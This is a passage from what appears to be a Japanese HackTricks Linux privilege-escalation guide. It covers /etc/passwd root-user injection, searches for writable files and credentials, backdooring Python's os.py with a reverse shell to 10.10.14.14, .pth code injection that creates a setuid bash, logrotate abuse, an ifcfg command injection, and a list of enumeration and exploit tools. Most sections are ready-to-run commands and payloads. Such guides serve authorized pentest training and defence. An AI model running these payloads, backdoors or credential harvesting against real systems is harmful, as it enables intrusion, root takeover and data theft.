hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを `hacker:hacker` で使用できます。

または、以下の行を使ってパスワードなしのダミーユーザーを追加できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

注意: BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` にあり、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密ファイルに書き込めるか**確認してください。たとえば、**サービス設定ファイル**に書き込めますか？

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

たとえば、マシンで **tomcat** サーバーが稼働していて、**/etc/systemd/ 内の Tomcat サービス設定ファイルを変更できる**場合、次の行を変更できます。

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

次回 tomcat が起動したときに、あなたの backdoor が実行されます。

### フォルダを確認

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のフォルダは読み取れませんが、試してみてください）

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### 不審な場所／所有ファイル

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### 直近数分間に変更されたファイル

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Sqlite DB ファイル

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

読み取り可能なアプリケーションデータベースでは、テーブル名とカラム名を調べ、ユーザー名やパスワードハッシュがないか確認します。ハッシュを見つけること、そのパスワードを復元すること、そしてローカルアカウントで再利用されていることを証明することは、それぞれ別の手順です。一般的な32文字の16進文字列だけでは、MD5やアカウントへのアクセス権があるとは判断できません。

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

読み取り可能なシェル履歴に `sudo` コマンドの後、短いパスワードらしき行がある場合は、前後の行を手動で確認してください。通常の `sudo` プロンプトに入力したパスワードはシェル履歴に保存されません。次の行は、誤ってシェルに入力された可能性があるだけで、有効なパスワードの証拠ではありません。`.sudo_as_admin_successful` マーカーが記録するのは過去の使用であり、現在の認可状態ではありません。

### 隠しファイル

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **PATH 内のスクリプト/バイナリ**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Webファイル**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **バックアップ**

バックアップディレクトリ内の読み取り可能なファイルに加え、**名前**に `backup` が含まれるファイルも調べてください。不透明な名前や暗号化された拡張子のアーカイブでも、古いアプリケーションデータが漏れている可能性があります。暗号化されたアーカイブは、あくまで露出の可能性がある対象です。パスワードの復元、内容の調査、アプリケーションのハッシュの復元、そのパスワードを Unix アカウントで再利用できるかの確認は、それぞれ別の手順です。アーカイブ内のハッシュだけでは、ローカルログインが可能だとは判断できません。

読み取り可能な仮想マシンのバックアップも同様に調べてください。VirtualBox の `.vbox` 設定ファイルから、接続されている `.vdi` イメージを特定でき、暗号化されたディスクキーのメタデータが含まれている場合もあります。[VirtualBox のドキュメントによると、暗号化されたデータキーは VM の設定ファイルに保存されます](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html)。オフラインでディスクを調査するには、設定ファイルとイメージの両方にアクセスできる必要があります。ゲストのボリュームに独自の [LUKS 暗号化レイヤー](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc)があり、別のキーが必要な場合もあります。許可を得て復号した後も、古いスクリプトや設定ファイルにパスワードが含まれている可能性があります。その認証情報がホストアカウントで現在も有効であること、そして有効な `sudo` ポリシーによって特権コマンドを実行できることを確認してから、ローカル権限昇格と判断してください。パッシブな列挙中は、イメージをコピー、復号、マウントせずにパスと権限を確認してください。

読み取り可能なアーカイブを調べるときは、何かを展開する前にメンバー名を一覧表示してください。隠れた認証情報ファイル、リカバリーコード、SSH キーなどが含まれている可能性があります。稼働中のコピーが保護されていても同様です。ファイル名は手掛かりにすぎません。内容と、アカウントで再利用されているかどうかは別途確認してください。

バックアップディレクトリでは、**他のユーザーが所有する読み取り可能なアーカイブ**を優先して確認してください。特に root 所有のアーカイブや、グループメンバーシップを通じてアクセスできるアーカイブが対象です。稼働中のコピーが保護されていても、古いアーカイブに設定情報や認証シークレットが含まれている可能性があります。[Backrest](https://garethgeorge.github.io/backrest/) のようなローカルバックアップ UI では、サービスの実効アカウントと、低い権限のユーザーが設定ファイルを読み取れるか、UI に認証できるかを確認してください。その [hooks](https://garethgeorge.github.io/backrest/docs/hooks) と [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) は、デーモンのファイル権限およびコマンド実行権限で動作します。ループバックリスナーであることだけでは、影響の大きさは判断できません。Backrest の `passwordBcrypt` は、[認証コード](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go)内にある base64 エンコードされた bcrypt ハッシュであり、平文パスワードではありません。露出したアーカイブや UI を権限境界として扱う前に、サービスの実行ユーザー、有効な認証情報、該当するプランまたはリポジトリへのアクセスを確認してください。

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを確認してください。**パスワードを含む可能性のある複数のファイル**を検索します。\
同様の目的で使える**もう1つの興味深いツール**は、Windows、Linux、Macのローカルコンピューターに保存された多数のパスワードを取得するためのオープンソースアプリケーション、[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。

`/etc/guacamole/guacamole.properties`を読み取れる場合は、`mysql-*`、`postgresql-*`、または`sqlserver-*`のデータベース接続設定を確認してください。アカウントにGuacamole JDBCテーブルの読み取り権限がある場合、`guacamole_connection_parameter`には保存済みのSSHの`username`、`password`、`private-key`、または`passphrase`の値が含まれていることがあります。まず接続IDとパラメーター名を確認し、その後、関連する行のみを調べてください。保存された値は、再利用可能なシークレットではなく、動的トークンやvaultへの参照である場合があります。[Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html)と[SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html)を参照してください。

[pswm password manager](https://github.com/Julynx/pswm#usage)は、デフォルトで暗号化されたvaultを`~/.local/share/pswm/pswm`に保存します。他のユーザーのvaultが見える場合は、その所有者と、自分のアカウントで実際に読み取れるかどうかを確認してください。vaultのパスだけでは認証情報はわかりません。マスターパスワードの復元、再利用可能なアカウントパスワードの発見、そのアカウントの権限の確認は、それぞれ別の手順です。

[Passpieのデフォルトデータベース](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database)は`~/.passpie/`で、グループディレクトリ内に`.keys`キーチェーンと、暗号化された`.pass`認証情報ファイルがあります。データベースディレクトリが見えるだけでは、パスの手がかりにすぎません。キーと関連する暗号化エントリーにアクセスできるか、マスターパスフレーズが必要か、復元した認証情報がより高い権限を持つアカウントのものかを確認してください。Passpieは[カスタムデータベースパス](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases)にも対応しているため、デフォルトのパスだけではすべてを網羅できません。自動列挙では、認証情報のエクスポートやキーマテリアルの表示を行わず、メタデータのみを一覧表示してください。

### ログ

ログを読める場合は、**興味深い情報や機密情報がログ内に見つかる**可能性があります。ログが奇妙であればあるほど、より興味深いものになるでしょう（おそらく）。\
また、設定に問題のある（一部改変された？）**audit log**では、この投稿で説明されているように、**パスワードをaudit logに記録できる**場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

ログを読む際にはグループ [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) が非常に役立ちます。

### シェルファイル

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### 一般的なCreds検索/正規表現

ファイル名またはファイルの内容に「**password**」という単語が含まれるファイルを探し、ログ内のIPアドレスやメールアドレス、ハッシュの正規表現も確認してください。\
ここではその方法をすべて列挙しませんが、興味があれば[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認してください。

## 書き込み可能なファイル

### Pythonライブラリの乗っ取り

Pythonスクリプトが**どこで**実行されるかがわかっていて、そのフォルダーに**書き込める**場合、またはPythonライブラリを**変更できる**場合は、OSライブラリを変更してバックドアを仕込めます（Pythonスクリプトの実行場所に書き込める場合は、os.pyライブラリをコピーして貼り付けてください）。

**ライブラリにバックドアを仕込む**には、os.pyライブラリの末尾に次の行を追加します（IPとPORTを変更してください）：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### `site.addsitedir()` で処理される書き込み可能な `.pth`

`site.addsitedir(DIR)` を `sys.path.append(DIR)` と同等に扱わないでください。`DIR` 内のすべての `*.pth` ファイルも処理します。`import` にスペースまたはタブが続く行は、Python コードとして実行されます。一方、パス行は site ディレクトリを基準に解決され、存在する場合にのみ追加されます。<sup>[[38]](#references)</sup>

sudo の実行が許可された、またはその他の特権を持つ Python プログラムが、現在のユーザーまたはそのユーザーが属するグループによって書き込み可能なディレクトリに対して `site.addsitedir()` を呼び出すと、これは privilege escalation につながります。特権プログラムが import パスを設定している間、通常の処理が実行される前に `.pth` のコードが実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

実行可能な `.pth` の内容は1行に収める必要がありますが、セミコロンを使えば複数の文を記述できます。たとえば、root権限で実行される処理でsetuid付きのBashコピーを作成できます。Bashは `-p` を付けて起動し、有効IDを保持します。<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

`-S` オプションが無効にするのは、Python による自動的な `site` 初期化だけです。プログラムが明示的に `site` をインポートして `site.addsitedir()` を呼び出す場合は保護されません。特権プロセスの import パスから攻撃者が書き込み可能なディレクトリを取り除き、そのディレクトリと `.pth` ファイルが特権管理者の所有であり、書き込みも特権管理者だけに許可されていることを確認してください。<sup>[[38]](#references)[[39]](#references)</sup>

### Logrotate の悪用

特権で実行される `logrotate` ジョブは、ローテーション時に、低い権限のユーザーが置き換えたりリダイレクトしたりできるディレクトリ内のログを実際にローテーションする場合、ユーザー間のファイル書き込み経路を生み出すことがあります。ログに書き込み可能というだけでは、調査の手掛かりにすぎません。有効なルールとその `create`、`olddir`、`su` ディレクティブ、スケジューラーの実効ユーザー、ログの親ディレクトリに対する書き込み権限と検索権限、さらにインストール済みビルドとポリシーで保存先の変更が許可されるかを確認してください。また、スタートアップファイルへの書き込みをコマンド実行につなげるには、後で起動する特権シェルがそのファイルを読み込む必要があります。ローテーションを起動したり、競合状態を試したりせずに、スケジュール、ルール、バージョンやパッケージング、パスのメタデータを調べてください。

> [!TIP]
> `3.18.0` やその他のバージョン文字列だけを、悪用可能性の判定基準にしないでください。[Upstream の変更履歴](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md)には、複数のリリースにおけるディレクトリおよびシンボリックリンクの強化が記録されており、ディストリビューションが修正をバックポートしている場合もあります。[Upstream のマニュアル](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in)では、特権ユーザーが非特権ユーザーの管理下にあるディレクトリ内のログをローテーションする場合、`su` を使用することが推奨されています。有効なルールと実際の動作を確認してください。

この脆弱性の詳細については、こちらのページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

この脆弱性は[**logrotten**](https://github.com/whotwagner/logrotten)で悪用できます。

この脆弱性は[**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **（nginx のログ）**とよく似ています。そのため、ログを変更できると分かった場合は、誰がそのログを管理しているかを確認し、ログをシンボリックリンクに置き換えることで権限昇格できないか調べてください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**脆弱性の参照先:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)。<sup>[[20]](#references)</sup>

低い権限のユーザーが `ifcfg-*` ファイルを作成または変更でき、かつ特権で実行されるネットワーク有効化処理がそのファイルを実際に読み込む場合、そのファイルは調査の手掛かりになります。有効なファイルとディレクトリの権限、選択されたインターフェース、インストール済みの `ifup`/`ifdown` の実装、そしてそれらを呼び出すユーザーを確認してください。ファイルに書き込み可能というだけでは、コードは実行されません。[Red Hat の RHEL 7 ネットワークガイド](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files)では、従来のネットワークスクリプトと NetworkManager が区別されています。NetworkManager 自体が従来のスクリプトを起動することはありません。[RHEL 8 のドキュメント](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking)によると、デフォルトの `ifup`/`ifdown` は NetworkManager を使用し、オプションの従来型パッケージがシェルスクリプトを提供します。

従来のスクリプトが実際に特権で実行されるシステムでは、引用符で囲まれていない、シェルによって読み込まれる `ifcfg-*` の代入文（`NAME=` など）が、コード実行の境界を越える可能性があります。正確なパーサー、値、有効化経路を確認してください。ファイル名や NetworkManager の存在だけから、シェルによる解釈を推測してはいけません。呼び出し元の入力を `ifcfg-*` ファイルに書き込み、その後に従来の `ifup` を呼び出す sudo 許可済みラッパーは、呼び出し元がファイルを直接編集できない場合でも、この境界に至る別の経路です。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

（Network と /bin/id の間に空白があることに注意）

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、System V init（SysVinit）の**スクリプト**が格納されています。SysVinit は**従来の Linux サービス管理システム**です。ここには、サービスを `start`、`stop`、`restart` し、場合によっては `reload` するためのスクリプトが含まれています。これらは直接実行するか、`/etc/rc?.d/` にあるシンボリックリンク経由で実行できます。Redhat 系システムでは、`/etc/rc.d/init.d` も代替パスとして使われます。

一方、`/etc/init` は **Upstart** に関連しています。Upstart は Ubuntu が導入した新しい**サービス管理システム**で、サービス管理タスクに設定ファイルを使用します。Upstart への移行後も、Upstart の互換性レイヤーにより、SysVinit スクリプトは Upstart の設定と併用されています。

**systemd** は、オンデマンドでのデーモン起動、自動マウント管理、システム状態のスナップショットなどの高度な機能を備えた、最新の初期化・サービスマネージャーです。ディストリビューションのパッケージ用には `/usr/lib/systemd/`、管理者による変更用には `/etc/systemd/system/` にファイルを整理し、システム管理のプロセスを効率化します。<sup>[[21]](#references)</sup>

## その他の手法

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### 制限付き Shell からの脱出


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../../network-services-pentesting/cisco-sd-wan-manager-local-privilege-escalation.md
{{#endref}}

## Android rooting frameworks: manager-channel の悪用

Android rooting frameworks は、一般に syscall をフックして、userspace manager から特権的なカーネル機能を利用できるようにします。manager の認証が弱い場合（例：FD の順序に基づく署名チェックや脆弱なパスワード方式）、ローカルアプリが manager に成りすまし、root 化済みデバイスで root 権限を取得できる可能性があります。詳細と exploit の説明はこちらをご覧ください。


{{#ref}}
../../../mobile-pentesting/android-app-pentesting/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## regex ベースの exec による VMware Tools service discovery LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations の regex ベースの service discovery は、プロセスのコマンドラインからバイナリのパスを抽出し、特権コンテキストで -v を付けて実行することがあります。許容範囲の広いパターン（例：\S を使用）では、書き込み可能な場所（例：/tmp/httpd）に攻撃者が設置した listener に一致する場合があり、root としての実行につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

詳細と、他の discovery/monitoring stack にも適用できる一般化されたパターンはこちらをご覧ください。

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## さらに詳しく

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc ツール

### **Linux のローカル Privilege escalation の手掛かりを探す最適なツール:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel vuln を列挙 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理アクセス):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**その他のスクリプト集**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning（Crontab UI の privesc、zip -P の認証情報再利用）](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron で実行される monitor 用の偽造 .text_sig payload](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch のバイパス（sudo env_keep PATH の乗っ取り）](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Linux の基本的な Privilege escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege escalation ガイド](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [攻撃と防御: 2016 年の Linux Privilege escalation 手法](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [誰も command execution を予想しない！](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – ラボ演習の解説 - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux Priv Escalation のヒントと手法](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux の列挙と Privilege escalation ツール](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket とは？](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) の writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS を使う](https://www.linuxjournal.com/article/7744)
- [17] [SUID Executables による Linux Privilege escalation](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Part-2 – Linux Privilege escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux で ACL を管理する方法](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [network-scripts による Redhat/CentOS の root 権限取得](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd とは？](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka（ログ経由の bash arithmetic injection、全体の攻撃チェーン）](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV（非対話型の起動ファイル）](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment（sudo env_keep BASH_ENV → root）](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous（sudo terraform dev_overrides + TF_VAR symlink による privesc）](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik（pg_basebackup cron copy → SUID bash）](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – 名前を付ければ、VMware が権限を昇格させる (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot による権限昇格](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 と CVE-2025-32463: Sudo の権限昇格脆弱性](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Repository ディレクトリ](https://peps.python.org/pep-3147/)
- [32] [Python importlib ドキュメント](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec による Tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux でのパスワードの記録](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - logrotate の race condition の詳細](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 ドキュメント – `site` とパス設定ファイル](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
